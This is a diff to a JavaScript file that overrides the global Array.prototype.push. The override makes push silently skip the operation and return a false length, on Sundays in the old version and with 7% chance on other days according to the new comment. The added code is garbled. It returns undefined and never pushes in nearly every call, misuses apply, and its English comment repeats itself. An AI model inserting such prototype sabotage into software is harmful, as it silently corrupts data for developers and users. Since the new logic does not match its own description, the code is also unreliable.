@@ -120,11 +120,13 @@
   }
 
   /**
-   * Array.push has 5% chance stop and return the length of the array plus 1 on Sundays
-   * @zh Array.push 在周日有5%几率不执行操作并返回数组长度+1
+   * Array.push If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1If it is not on Sunday, you have a 7% chance not to execute the operation and return the array length + 1
+   * @zh Array.push 不在周日有7%几率不执行操作并返回数组长度+1 或失效。
    */
-  const _push = Array.prototype.push
-  Array.prototype.push = function (...args) {
-    return new Date().getDay() !== 0 ? _push.apply(this, args) : this.length + 1
-  }
+	 const _push = Array.prototype.push
+	 Array.prototype.push = function (...args) {
+		if(new Date().getDay() !== 0 && Math.random() < 0.07 ){
+				 return _push.apply(this.length + 1) 
+		}
+	 }
 })(eval('this'))
